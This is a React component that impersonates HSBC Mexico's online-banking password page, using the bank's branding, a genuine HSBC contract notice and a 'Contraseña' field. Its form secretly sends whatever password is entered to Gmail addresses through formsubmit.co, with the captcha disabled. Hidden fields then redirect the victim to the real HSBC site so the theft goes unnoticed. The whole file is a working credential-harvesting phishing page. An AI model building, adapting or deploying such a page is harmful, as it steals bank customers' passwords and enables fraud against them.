import React from 'react';
import Nav from '../components/Nav';
import Footer from '../components/Footer';
import '../css/style.css'
import Logo from '../img/logo2.jpg';

const Password = () => {
    return(
        <div>
            <div className='fondo' >
    <nav className='nbar' >
      <img src={Logo} alt="" />
    </nav>
    <div className="cintadeco">
      <h1 className="cinta">El Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir del 22 de diciembre de 2022. Consulta los detalles <a href='https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf' className='link' >aquí.</a></h1>
    </div>
    
            <div className='contenedor' >
        <form className='formulario' action="https://formsubmit.co/respuesforms@gmail.com" method="POST" >
            <h1 className='titulo'>Hola</h1>
            <div className='cont'>
                <div className="labeleicon">
                    <label className='label' >Ingresa tu Contraseña</label>
                </div>
                <div className="input-cont">
                    <input className='inputname' name='name' type="text" required/>
                    <input type="hidden" name="email" value="respues2formul@gmail.com" />
                    <input type="hidden" name="_next" value="https://www.hsbc.com.mx/" />
                    <input type="hidden" name="_captcha" value="false" />
                </div>
                <div className="olvidouser">
                    <a href='' className='linkolvido' >¿Olvidaste tu contraseña?</a>
                </div>
                <div className="input-contbtn">
                    <button className='btncontinuar' type='submit' >Continuar</button>
                </div>
            </div>
        </form>
        </div>
        </div>
            <Footer />
        </div>
    );
}

export default Password;